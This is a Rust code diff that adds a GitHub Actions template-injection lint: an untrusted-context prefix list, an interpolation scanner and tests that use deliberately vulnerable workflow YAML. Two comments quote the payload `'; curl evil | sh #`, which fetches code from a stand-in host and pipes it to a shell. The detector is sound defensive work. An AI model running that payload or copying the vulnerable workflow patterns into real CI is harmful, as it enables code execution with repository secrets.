@@ -472,6 +472,44 @@ pub struct WorkflowFinding {
     /// did not fire for an untrusted-checkout reason.
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub untrusted_checkouts: Vec<UntrustedCheckout>,
+    /// `${{ <attacker-controlled> }}` expressions embedded directly in
+    /// a `run:` body or an `actions/github-script` `script:` body.
+    /// Empty when the rule did not fire for a template-injection
+    /// reason.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub template_injections: Vec<TemplateInjection>,
+}
+
+/// One `${{ <expr> }}` interpolation of an attacker-controlled
+/// GitHub Actions context value into shell or JS that runs on the
+/// runner. The classic exploit shape: a PR title of
+/// `'; curl evil | sh #` becomes literal shell when the runner
+/// expands the interpolation before invoking bash.
+#[derive(Debug, Clone, Serialize)]
+pub struct TemplateInjection {
+    pub job: String,
+    pub step: Option<String>,
+    /// `run` for shell, `script` for `actions/github-script`. Both
+    /// share the same root cause — context expansion happens before
+    /// the body is handed to its interpreter.
+    pub kind: TemplateInjectionKind,
+    /// The exact expression body (between `${{ ` and ` }}`),
+    /// whitespace-trimmed. Lets reviewers grep without re-finding
+    /// the line.
+    pub expression: String,
+    /// Which attacker-controlled context prefix matched — the part
+    /// of `expression` we recognised. Helps reviewers understand why
+    /// the lint fired without having to re-derive the rule.
+    pub matched_prefix: &'static str,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
+#[serde(rename_all = "snake_case")]
+pub enum TemplateInjectionKind {
+    /// `run: ...` body in any step.
+    Run,
+    /// `with.script: ...` body of an `actions/github-script` step.
+    GithubScript,
 }
 
 #[derive(Debug, Clone, Serialize)]
@@ -522,11 +560,38 @@ pub fn audit_workflow_yaml(yaml: &str) -> Result<Vec<WorkflowFinding>> {
         .filter(|t| DANGEROUS_TRIGGERS.contains(&t.as_str()))
         .cloned()
         .collect();
-    if dangerous.is_empty() {
-        return Ok(Vec::new());
-    }
 
     let mut out = Vec::new();
+
+    // template-injection is independent of `on:` triggers — a
+    // `head_commit.message` interpolation on a `push` workflow is
+    // just as exploitable as one on `pull_request_target`. Run the
+    // scan first so it fires even when the trigger gate below
+    // short-circuits.
+    let injections = collect_template_injections(&doc);
+    if !injections.is_empty() {
+        let msg = "workflow embeds attacker-controlled context values (PR/issue titles, \
+                   commit messages, branch names, …) directly inside `${{ … }}` in a `run:` or \
+                   `actions/github-script` body. The runner expands the interpolation *before* \
+                   handing the body to the shell or JS engine, so a hostile value executes as \
+                   literal code with the workflow's secrets. Assign the value to an env var via \
+                   `env:` and reference it as `\"$VAR\"` in shell (or `process.env.VAR` in \
+                   github-script) so the runtime never sees the bytes as code."
+            .to_string();
+        out.push(WorkflowFinding {
+            rule: "template_injection",
+            severity: Severity::Error,
+            message: msg,
+            triggers: Vec::new(),
+            cache_writers: Vec::new(),
+            untrusted_checkouts: Vec::new(),
+            template_injections: injections,
+        });
+    }
+
+    if dangerous.is_empty() {
+        return Ok(out);
+    }
 
     let writers = collect_cache_writers(&doc);
     if !writers.is_empty() {
@@ -546,6 +611,7 @@ pub fn audit_workflow_yaml(yaml: &str) -> Result<Vec<WorkflowFinding>> {
             triggers: dangerous.clone(),
             cache_writers: writers,
             untrusted_checkouts: Vec::new(),
+            template_injections: Vec::new(),
         });
     }
 
@@ -569,6 +635,7 @@ pub fn audit_workflow_yaml(yaml: &str) -> Result<Vec<WorkflowFinding>> {
             triggers: dangerous,
             cache_writers: Vec::new(),
             untrusted_checkouts: checkouts,
+            template_injections: Vec::new(),
         });
     }
 
@@ -813,6 +880,144 @@ fn is_falsy(v: &serde_yaml::Value) -> bool {
         serde_yaml::Value::Null => true,
         _ => false,
     }
+}
+
+/// Untrusted GitHub Actions context prefixes — values an external
+/// PR author / issue author / push author controls. Matched
+/// case-insensitively as a leading-substring of the trimmed
+/// `${{ ... }}` expression (any function wrapping like
+/// `format(..., github.event.X)` or `toJSON(github.event.X)` is
+/// deliberately out of scope for the first slice; zizmor goes
+/// further but at the cost of a full expression parser).
+const UNTRUSTED_CONTEXT_PREFIXES: &[&str] = &[
+    "github.event.issue.title",
+    "github.event.issue.body",
+    "github.event.pull_request.title",
+    "github.event.pull_request.body",
+    "github.event.pull_request.head.ref",
+    "github.event.pull_request.head.label",
+    // Fork repo names/owner strings are attacker-controlled.
+    "github.event.pull_request.head.repo",
+    "github.event.comment.body",
+    "github.event.review.body",
+    "github.event.review_comment.body",
+    "github.event.pages",
+    "github.event.commits",
+    "github.event.head_commit.message",
+    "github.event.head_commit.author",
+    "github.event.workflow_run.head_commit.message",
+    "github.event.workflow_run.head_branch",
+    "github.event.discussion.title",
+    "github.event.discussion.body",
+    "github.event.discussion_comment.body",
+    // PR head branch name on `pull_request` triggers.
+    "github.head_ref",
+];
+
+fn collect_template_injections(doc: &serde_yaml::Value) -> Vec<TemplateInjection> {
+    let mut out = Vec::new();
+    let Some(jobs) = doc.get("jobs").and_then(|v| v.as_mapping()) else {
+        return out;
+    };
+    for (job_id, job_val) in jobs {
+        let job_id = job_id.as_str().unwrap_or("<non-string>").to_string();
+        let Some(job_map) = job_val.as_mapping() else {
+            continue;
+        };
+        let Some(steps) = job_map
+            .get(serde_yaml::Value::String("steps".into()))
+            .and_then(|v| v.as_sequence())
+        else {
+            continue;
+        };
+        for step in steps {
+            let Some(step_map) = step.as_mapping() else {
+                continue;
+            };
+            let step_name = step_map
+                .get(serde_yaml::Value::String("name".into()))
+                .and_then(|v| v.as_str())
+                .map(String::from);
+
+            // `run:` block in any step.
+            if let Some(run_val) = step_map.get(serde_yaml::Value::String("run".into()))
+                && let Some(body) = run_val.as_str()
+            {
+                for (expression, matched_prefix) in find_untrusted_interpolations(body) {
+                    out.push(TemplateInjection {
+                        job: job_id.clone(),
+                        step: step_name.clone(),
+                        kind: TemplateInjectionKind::Run,
+                        expression,
+                        matched_prefix,
+                    });
+                }
+            }
+
+            // `actions/github-script` `with.script:` body.
+            if let Some(uses) = step_map
+                .get(serde_yaml::Value::String("uses".into()))
+                .and_then(|v| v.as_str())
+            {
+                let path = uses.split_once('@').map(|(p, _)| p).unwrap_or(uses);
+                if path.eq_ignore_ascii_case("actions/github-script")
+                    && let Some(with) = step_map
+                        .get(serde_yaml::Value::String("with".into()))
+                        .and_then(|v| v.as_mapping())
+                    && let Some(script) = with
+                        .get(serde_yaml::Value::String("script".into()))
+                        .and_then(|v| v.as_str())
+                {
+                    for (expression, matched_prefix) in find_untrusted_interpolations(script) {
+                        out.push(TemplateInjection {
+                            job: job_id.clone(),
+                            step: step_name.clone(),
+                            kind: TemplateInjectionKind::GithubScript,
+                            expression,
+                            matched_prefix,
+                        });
+                    }
+                }
+            }
+        }
+    }
+    out
+}
+
+/// Walk `body` byte-by-byte looking for `${{ … }}` interpolations.
+/// For each, trim the inner expression and check whether it begins
+/// with any [`UNTRUSTED_CONTEXT_PREFIXES`] entry (case-insensitive).
+/// Returns `(expression, matched_prefix)` for every hit so callers
+/// see the exact expression and the rule that flagged it.
+fn find_untrusted_interpolations(body: &str) -> Vec<(String, &'static str)> {
+    let bytes = body.as_bytes();
+    let mut out = Vec::new();
+    let mut i = 0;
+    while i + 3 < bytes.len() {
+        if &bytes[i..i + 3] == b"${{" {
+            // Find matching `}}`. Bare scan — GitHub Actions
+            // expressions cannot themselves contain `}}` literally,
+            // so the first occurrence ends the interpolation.
+            let start = i + 3;
+            if let Some(rel) = bytes[start..].windows(2).position(|w| w == b"}}") {
+                let inner = &body[start..start + rel];
+                let trimmed = inner.trim();
+                let lower = trimmed.to_ascii_lowercase();
+                if let Some(prefix) = UNTRUSTED_CONTEXT_PREFIXES
+                    .iter()
+                    .find(|p| lower.starts_with(*p))
+                {
+                    out.push((trimmed.to_string(), *prefix));
+                }
+                i = start + rel + 2;
+                continue;
+            }
+            // Unterminated `${{` — skip the rest, malformed YAML.
+            break;
+        }
+        i += 1;
+    }
+    out
 }
 
 fn yaml_scalar_display(v: &serde_yaml::Value) -> String {
@@ -1534,5 +1739,204 @@ jobs:
         assert_eq!(url_encode_ref("v4"), "v4");
         assert_eq!(url_encode_ref("feature/x"), "feature%2Fx");
         assert_eq!(url_encode_ref("v1.0+build"), "v1.0%2Bbuild");
+    }
+
+    // --- template-injection rule -----------------------------------------
+
+    #[test]
+    fn template_injection_fires_on_pr_title_in_run_body() {
+        // The canonical zizmor / harden-runner example: PR title
+        // interpolated into a shell `run:` block. A title of
+        // `'; curl evil | sh #` becomes literal shell.
+        let yaml = r#"
+on: [pull_request]
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Echo PR title
+        run: echo "PR title is ${{ github.event.pull_request.title }}"
+"#;
+        let f = audit_workflow_yaml(yaml).unwrap();
+        let ti = f
+            .iter()
+            .find(|w| w.rule == "template_injection")
+            .unwrap_or_else(|| panic!("no template_injection finding: {f:#?}"));
+        assert_eq!(ti.severity, Severity::Error);
+        assert_eq!(ti.template_injections.len(), 1);
+        let inj = &ti.template_injections[0];
+        assert_eq!(inj.kind, TemplateInjectionKind::Run);
+        assert_eq!(inj.matched_prefix, "github.event.pull_request.title");
+        assert_eq!(inj.job, "greet");
+        assert_eq!(inj.step.as_deref(), Some("Echo PR title"));
+        assert_eq!(inj.expression, "github.event.pull_request.title");
+    }
+
+    #[test]
+    fn template_injection_fires_on_head_commit_message_in_push_workflow() {
+        // Independent of trigger — push workflows are exploitable too.
+        let yaml = r#"
+on: [push]
+jobs:
+  build:
+    steps:
+      - run: |
+          echo "${{ github.event.head_commit.message }}"
+          ./build.sh
+"#;
+        let f = audit_workflow_yaml(yaml).unwrap();
+        let ti = f.iter().find(|w| w.rule == "template_injection").unwrap();
+        assert_eq!(ti.template_injections.len(), 1);
+        assert_eq!(
+            ti.template_injections[0].matched_prefix,
+            "github.event.head_commit.message"
+        );
+    }
+
+    #[test]
+    fn template_injection_fires_on_github_head_ref() {
+        // The most common foot-gun: `github.head_ref` is the PR
+        // branch name, attacker-controlled when the PR comes from a
+        // fork.
+        let yaml = r#"
+on: [pull_request]
+jobs:
+  ci:
+    steps:
+      - run: echo "branch is ${{ github.head_ref }}"
+"#;
+        let f = audit_workflow_yaml(yaml).unwrap();
+        let ti = f.iter().find(|w| w.rule == "template_injection").unwrap();
+        assert_eq!(ti.template_injections.len(), 1);
+        assert_eq!(ti.template_injections[0].matched_prefix, "github.head_ref");
+    }
+
+    #[test]
+    fn template_injection_fires_inside_github_script_action() {
+        // Same root cause, different interpreter — `actions/github-script`
+        // expands `${{ … }}` before the JS engine sees the body.
+        let yaml = r#"
+on: [pull_request_target]
+jobs:
+  triage:
+    steps:
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            const title = `${{ github.event.pull_request.title }}`;
+            console.log(title);
+"#;
+        let f = audit_workflow_yaml(yaml).unwrap();
+        // pull_request_target+checkout doesn't fire here (no checkout
+        // step), and there's no cache writer — so the only finding
+        // should be the template-injection one.
+        let ti = f.iter().find(|w| w.rule == "template_injection").unwrap();
+        assert_eq!(ti.template_injections.len(), 1);
+        assert_eq!(
+            ti.template_injections[0].kind,
+            TemplateInjectionKind::GithubScript
+        );
+        assert_eq!(
+            ti.template_injections[0].matched_prefix,
+            "github.event.pull_request.title"
+        );
+    }
+
+    #[test]
+    fn template_injection_quiet_on_safe_contexts() {
+        // `github.sha`, `github.ref`, `runner.os`, `secrets.*`,
+        // `vars.*` — none of these are attacker-controlled in the
+        // injection sense (yes secrets are sensitive, but they're
+        // not user-supplied strings).
+        let yaml = r#"
+on: [push]
+jobs:
+  build:
+    steps:
+      - run: |
+          echo "sha=${{ github.sha }}"
+          echo "os=${{ runner.os }}"
+          echo "ref=${{ github.ref }}"
+          echo "tag=${{ secrets.GITHUB_TOKEN }}"
+          echo "var=${{ vars.SOMETHING }}"
+"#;
+        let f = audit_workflow_yaml(yaml).unwrap();
+        assert!(
+            f.iter().all(|w| w.rule != "template_injection"),
+            "safe contexts must not fire template-injection: {f:#?}"
+        );
+    }
+
+    #[test]
+    fn template_injection_quiet_on_workflow_without_run_or_script() {
+        // Composite `uses:`-only steps don't carry a run body.
+        let yaml = r#"
+on: [pull_request]
+jobs:
+  noop:
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+"#;
+        let f = audit_workflow_yaml(yaml).unwrap();
+        assert!(f.iter().all(|w| w.rule != "template_injection"));
+    }
+
+    #[test]
+    fn template_injection_handles_multiple_hits_per_step() {
+        let yaml = r#"
+on: [pull_request_target]
+jobs:
+  greet:
+    steps:
+      - run: |
+          echo "title=${{ github.event.pull_request.title }}"
+          echo "body=${{ github.event.pull_request.body }}"
+          echo "safe=${{ github.sha }}"
+"#;
+        let f = audit_workflow_yaml(yaml).unwrap();
+        let ti = f.iter().find(|w| w.rule == "template_injection").unwrap();
+        assert_eq!(
+            ti.template_injections.len(),
+            2,
+            "two distinct untrusted interpolations expected"
+        );
+        let prefixes: Vec<_> = ti
+            .template_injections
+            .iter()
+            .map(|t| t.matched_prefix)
+            .collect();
+        assert!(prefixes.contains(&"github.event.pull_request.title"));
+        assert!(prefixes.contains(&"github.event.pull_request.body"));
+    }
+
+    #[test]
+    fn template_injection_is_case_insensitive_on_context_path() {
+        // Real-world workflows sometimes use mixed case — the
+        // GitHub expression language is case-insensitive on context
+        // identifiers, so our matcher must be too.
+        let yaml = r#"
+on: [push]
+jobs:
+  build:
+    steps:
+      - run: echo "${{ GitHub.Event.Head_Commit.Message }}"
+"#;
+        let f = audit_workflow_yaml(yaml).unwrap();
+        let ti = f.iter().find(|w| w.rule == "template_injection").unwrap();
+        assert_eq!(ti.template_injections.len(), 1);
+        assert_eq!(
+            ti.template_injections[0].matched_prefix,
+            "github.event.head_commit.message"
+        );
+    }
+
+    #[test]
+    fn find_untrusted_interpolations_unit_handles_unterminated() {
+        // Malformed body — no closing `}}`. Must not panic.
+        let hits = find_untrusted_interpolations("echo ${{ github.event.pull_request.title");
+        assert!(hits.is_empty());
     }
 }
